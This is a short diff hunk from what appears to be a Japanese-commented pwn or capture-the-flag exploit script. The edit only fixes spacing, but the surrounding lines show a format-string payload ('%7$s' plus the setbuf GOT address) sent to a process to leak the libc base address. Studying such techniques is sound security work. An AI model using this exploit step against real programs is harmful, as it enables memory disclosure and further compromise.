@@ -109,7 +109,7 @@ uv run fsb.py
     # == libc base addr leak ==
     addr_setbuf_got = elf.got("setbuf") # got addrを調べる
     payload = b"%7$sPPPP" 
-    payload+= p64(addr_setbuf_got) 
+    payload += p64(addr_setbuf_got) 
 
     proc.sendafter("Input message", payload)
     proc.recv(1) # putsの出力する改行を飛ばす
